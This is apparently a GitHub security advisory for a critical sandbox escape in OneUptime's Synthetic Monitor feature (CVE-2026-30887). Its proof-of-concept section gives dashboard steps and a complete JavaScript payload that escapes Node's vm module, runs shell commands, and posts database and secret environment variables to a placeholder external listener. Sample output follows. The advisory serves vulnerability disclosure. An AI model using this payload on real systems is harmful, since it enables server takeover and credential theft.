# [C] OneUpTime's Unsandboxed Code Execution in Probe Allows Any Project Member to Achieve RCE

## Summary
Severity: Critical
Advisory: GHSA-h343-gg57-2q67
CVE: CVE-2026-30887
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-07
Source: https://github.com/advisories/GHSA-h343-gg57-2q67
Type: github-advisory

## Affected
- npm: `@oneuptime/common` — affected >=0 <10.0.18

## Details
### Summary
OneUptime allows project members to run custom Playwright/JavaScript code via Synthetic Monitors to test websites. However, the system executes this untrusted user code inside the insecure Node.js `vm` module. By leveraging a standard prototype-chain escape (`this.constructor.constructor`), an attacker can bypass the sandbox, gain access to the underlying Node.js `process` object, and execute arbitrary system commands (RCE) on the `oneuptime-probe` container. Furthermore, because the probe holds database/cluster credentials in its environment variables, this directly leads to a complete cluster compromise.

### Details
The root cause of the vulnerability exists in [Common/Server/Utils/VM/VMRunner.ts](oneuptime/Common/Server/Utils/VM/VMRunner.ts) where user-supplied JavaScript is executed using `vm.runInContext()`:

```typescript
const vmPromise = vm.runInContext(script, sandbox, { ... });
```

The Node.js documentation explicitly warns that the `vm` module is not a security boundary and should never be used to run untrusted code. 

When a user creates a **Synthetic Monitor**, the code inputted into the Playwright script editor is passed directly to this backend function without any AST filtering or secure isolation (e.g., `isolated-vm` or a dedicated restricted container). 

An attacker can use the payload `const proc = this.constructor.constructor('return process')();` to step out of the sandbox context and grab the host's native `process` object. From there, they can require `child_process` to execute arbitrary shell commands. 

Since the `oneuptime-probe` service runs with access to sensitive environment variables (such as `ONEUPTIME_SECRET`, `DATABASE_PASSWORD`, etc.), an attacker can trivially exfiltrate these secrets to an external server.

### PoC
This exploit can be triggered entirely through the OneUptime web dashboard GUI by any user with at least "Project Member" permissions.

1. **Log In**: Authenticate to the OneUptime Dashboard. (Open registration is enabled by default).
2. **Navigate**: Go to **Monitors** > **Create New Monitor**.
3. **Monitor Type**: Select **Synthetic Monitor**.
4. **Browser/Screen Settings**: Ensure **Chromium** is selected for "Browser Types" and **Desktop** is selected for "Screen Size Types".
5. **Payload Injection**: Scroll down to the "Playwright Code" editor. Delete the default template and paste the following malicious JavaScript payload:

```javascript
return new Promise((resolve) => {
    try {
        // 1. Traverse the prototype chain to grab the host's process object
        const proc = this.constructor.constructor('return process')();
        
        // 2. Load the host's child_process module & run a system command
        const cp = proc.mainModule.require('child_process');
        const output = cp.execSync('ls -la /usr/src/app').toString();
        
        // 3. (Optional) Read sensitive environment secrets
        const secret = proc.env.ONEUPTIME_SECRET;
        const db_pass = proc.env.DATABASE_PASSWORD;
        
        // 4. Exfiltrate the data via the native `http` module
        const http_real = proc.mainModule.require('http');
        const req = http_real.request({ 
            hostname: 'YOUR_OAST_OR_BURP_COLLABORATOR_URL_HERE', 
            port: 80, 
            path: '/', 
            method: 'POST' 
        }, (res) => {
            resolve("EXFILTRATION_STATUS: " + res.statusCode);
        });
        
        req.on('error', (e) => resolve("EXFILTRATION_ERROR: " + e.message));
        
        const payloadData = JSON.stringify({ rce_output: output, secret: secret, db: db_pass });
        req.write(payloadData);
        req.end();
    } catch(e) {
        resolve("CRITICAL_ERROR: " + e.message);
    }
});
```

6. **Save & Execute**: Click **Save**. Within 60 seconds, the probe worker will pick up the monitor, execute the code, and send the RCE output to your external listener URL.

OUTPUT:
```
{"rce_output":"total 296\ndrwxr-xr-x   1 root root   4096 Mar  3 18:27 .\ndrwxr-xr-x   1 root root   4096 Mar  3 18:26 ..\n-rw-r--r--   1 root root     16 Mar  3 18:24 .gitattributes\n-rwxr-xr-x   1 root root    403 Mar  3 18:24 .gitignore\ndrwxr-xr-x   2 root root   4096 Mar  3 18:24 API\n-rw-r--r--   1 root root   4103 Mar  3 18:24 Config.ts\n-rw-r--r--   1 root root   2602 Mar  3 18:24 Dockerfile\n-rw-r--r--   1 root root   2705 Mar  3 18:24 Dockerfile.tpl\n-rw-r--r--   1 root root   2935 Mar  3 18:24 Index.ts\ndrwxr-xr-x   3 root root   4096 Mar  3 18:24 Jobs\ndrwxr-xr-x   2 root root   4096 Mar  3 18:24 Services\ndrwxr-xr-x   4 root root   4096 Mar  3 18:24 Tests\ndrwxr-xr-x   3 root root   4096 Mar  3 18:24 Utils\ndrwxr-xr-x   3 root root   4096 Mar  3 18:27 build\n-rw-r--r--   1 root root    889 Mar  3 18:24 jest.config.json\ndrwxr-xr-x 297 root root  12288 Mar  3 18:26 node_modules\n-rw-r--r--   1 root root    353 Mar  3 18:24 nodemon.json\n-rw-r--r--   1 root root 203119 Mar  3 18:24 package-lock.json\n-rw-r--r--   1 root root   1481 Mar  3 18:24 package.json\n-rw-r--r--   1 root root  11514 Mar  3 18:24 tsconfig.json\n"}

```
<img width="1364" height="470" alt="image" src="https://github.com/user-attachments/assets/9e0d3013-bba5-4188-8777-6903c8f55dba" />


### Impact
**What kind of vulnerability is it?** 
Remote Code Execution (RCE) / Code Injection / Sandbox Escape.

**Who is impacted?** 
Any OneUptime deployment running version <= 10.0.0. Since open registration is enabled by default, an external, unauthenticated attacker can create an account, create a project, and instantly compromise the entire cluster.

---

## References
- https://github.com/OneUptime/oneuptime/security/advisories/GHSA-h343-gg57-2q67
- https://nvd.nist.gov/vuln/detail/CVE-2026-30887
- https://github.com/OneUptime/oneuptime
